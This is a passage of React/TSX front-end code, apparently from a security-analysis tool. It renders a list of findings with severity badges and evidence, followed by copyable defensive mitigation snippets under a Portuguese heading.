                    <div className="flex items-center gap-2">
                      <Badge variant={severityBadgeVariant(a.severity)}>
                        {a.severity}
                      </Badge>
                      <span className="font-semibold">{a.title}</span>
                    </div>
                    <p className="text-slate-400">{a.description}</p>
                    <div className="font-mono text-[11px] text-slate-300">
                      {a.evidence}
                    </div>
                  </div>
                ))}
              </div>
            )}

            <div className="space-y-2">
              <div className="font-semibold">
                Snippets Prontos de Mitigação Defensiva
              </div>
              {result.mitigation_snippets.map((snip) => (
                <div
                  key={snip.platform}
                  className="p-3 rounded border border-slate-200 dark:border-slate-800 space-y-1.5"
                >
                  <div className="flex items-center justify-between">
                    <div className="font-semibold">
                      {snip.platform} — {snip.title}
                    </div>
                    <CopyTextButton value={snip.code} />
                  </div>
                  <pre className="p-2.5 rounded bg-slate-950 font-mono text-[11px] overflow-x-auto">
                    {snip.code}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
